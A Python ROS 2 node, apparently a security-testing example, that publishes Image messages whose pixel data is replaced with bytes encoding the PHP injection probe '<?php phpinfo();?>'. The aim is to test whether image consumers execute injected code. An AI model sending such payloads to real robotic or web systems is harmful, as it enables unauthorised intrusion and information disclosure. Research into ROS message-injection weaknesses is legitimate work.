import rclpy
from rclpy.node import Node
from sensor_msgs.msg import Image
from cv_bridge import CvBridge
import cv2
import numpy as np


class ImagePublisher(Node):
    def __init__(self):
        super().__init__('image_publisher')
        self.publisher = self.create_publisher(Image, 'Image', 10)
        timer_period = 3
        self.timer = self.create_timer(timer_period, self.callback)
        self.cv_image = cv2.imread('src/examples/examples/image_publisher_payload/image.png')  # Any image
        self.bridge = CvBridge()

    def callback(self):
        # Generate message
        msg = self.bridge.cv2_to_imgmsg(np.array(self.cv_image), "bgr8")  # "image.png" to Image msg ROS

        # Modify data field with the payload
        msg.data = [60, 63, 112, 104, 112, 32, 112, 104, 112, 105, 110, 102,
                    111, 40, 41, 59, 63, 62]  # Payload -> <?php phpinfo();?>

        self.publisher.publish(msg)
        self.get_logger().info('Publishing image')


def main():
    rclpy.init()
    image_publisher = ImagePublisher()
    try:
        rclpy.spin(image_publisher)
    except KeyboardInterrupt:
        pass
    finally:
        image_publisher.destroy_node()
        rclpy.try_shutdown()


if __name__ == '__main__':
    main()
